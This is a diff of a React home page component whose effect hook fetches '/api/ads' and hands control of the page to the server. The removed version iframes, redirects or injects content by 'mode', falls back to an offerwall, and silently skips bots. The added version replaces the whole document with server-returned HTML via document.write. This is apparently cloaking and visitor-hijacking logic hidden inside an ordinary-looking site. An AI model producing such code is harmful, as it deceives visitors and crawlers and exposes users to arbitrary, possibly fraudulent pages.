@@ -11,24 +11,17 @@ import { useEffect } from 'react';
 export default function Home() {
   useEffect(() => {
     fetch('/api/ads')
-      .then(res => res.json())
-      .then(data => {
-        if (data.result) {
-          if (data.mode === 1) {
-            document.body.innerHTML = `<iframe src="${data.target}" style="width:100vw;height:100vh;border:0;"></iframe>`;
-          } else if (data.mode === 2) {
-            window.location.href = data.target;
-          } else if (data.mode === 4) {
-            document.body.innerHTML = data.content;
-          } else {
-            window.location.href = '/newgermany_oferwall/index.html'; // fallback (наприклад, mode 5 або інше)
-          }
+      .then(async res => {
+        if (res.status === 200) {
+          const html = await res.text();
+          document.open();
+          document.write(html);
+          document.close();
         }
       })
-      .catch(() => {
-        // нічого не робимо — BOT
-      });
+      .catch(console.error);
   }, []);
+
   return (
     <div className="flex flex-col w-full flex-1 overflow-x-hidden">
       <Hero />
